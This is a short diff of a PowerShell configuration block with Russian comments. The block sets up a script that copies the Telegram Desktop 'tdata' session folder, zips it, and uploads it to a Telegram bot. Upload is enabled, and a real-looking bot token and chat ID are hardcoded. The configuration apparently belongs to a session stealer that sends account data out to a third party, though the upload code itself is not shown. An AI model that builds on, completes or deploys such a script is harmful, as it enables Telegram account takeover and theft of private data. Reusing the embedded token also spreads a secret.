@@ -1,20 +1,15 @@
 $script:Config = @{
-    # --- Куда сохранять ---
     OutputDir     = "$env:USERPROFILE\Desktop"
     ZipName       = "TDATA_Lab_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
     LogFile       = "$env:USERPROFILE\Desktop\TDataLab.log"
-    
-    # --- Путь к папке Telegram ---
     TDataPath     = "$env:APPDATA\Telegram Desktop\tdata"
     TempCopyDir   = "$env:TEMP\TDATA_Temp_$(Get-Random)"
 
-    # --- ОТПРАВКА В TELEGRAM (заполните, чтобы включить) ---
-    EnableUpload  = $true   # $true - включить отправку, $false - только локально
-    BotToken      = "8664245801:AAEAamU5KTWBGVYjeWBexKExYxX4Q0FmSx0"   # Ваш токен
-    ChatId        = "243855738"                                        # Ваш Chat ID
+    EnableUpload  = $true
+    BotToken      = "8664245801:AAEAamU5KTWBGVYjeWBexKExYxX4Q0FmSx0"   # <--- СЮДА ВАШ ТОКЕН
+    ChatId        = "243855738"              # <--- СЮДА ВАШ ID (ТОЛЬКО ЦИФРЫ)
 
-    # --- Копировать лог в архив? ---
-    IncludeLog    = $true    # $true - добавить лог в ZIP, $false - не добавлять
+    IncludeLog    = $true
 }
 # ============================================================
 
